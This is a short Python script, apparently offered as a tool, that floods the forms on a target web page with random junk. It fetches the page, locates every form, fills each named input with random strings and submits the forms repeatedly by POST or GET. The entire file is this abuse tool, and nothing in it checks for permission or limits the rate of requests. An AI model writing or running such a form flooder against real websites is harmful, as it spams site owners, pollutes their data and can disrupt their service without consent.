import requests
from bs4 import BeautifulSoup
import random
import string

def generate_junk_data(length=20):
    """Generate random junk data for form fields."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def flood_forms(url, num_requests=10):
    """Flood forms on the target URL with junk data."""
    try:
        for _ in range(num_requests):
            # Fetch the target page to extract form details
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms on the page
            forms = soup.find_all('form')
            if not forms:
                print("No forms found on the page.")
                return
            
            for form in forms:
                # Extract form action and method
                action = form.get('action', url)
                method = form.get('method', 'get').lower()
                
                # Prepare junk data for all input fields
                data = {}
                for input_tag in form.find_all('input'):
                    name = input_tag.get('name')
                    if name:
                        data[name] = generate_junk_data()
                
                # Submit the form with junk data
                if method == 'post':
                    requests.post(action, data=data)
                else:
                    requests.get(action, params=data)
                
                print(f"Submitted junk data to form at {action}")
        
        print(f"Form flooding completed. Sent {num_requests} requests.")
    except Exception as e:
        print(f"An error occurred: {e}")


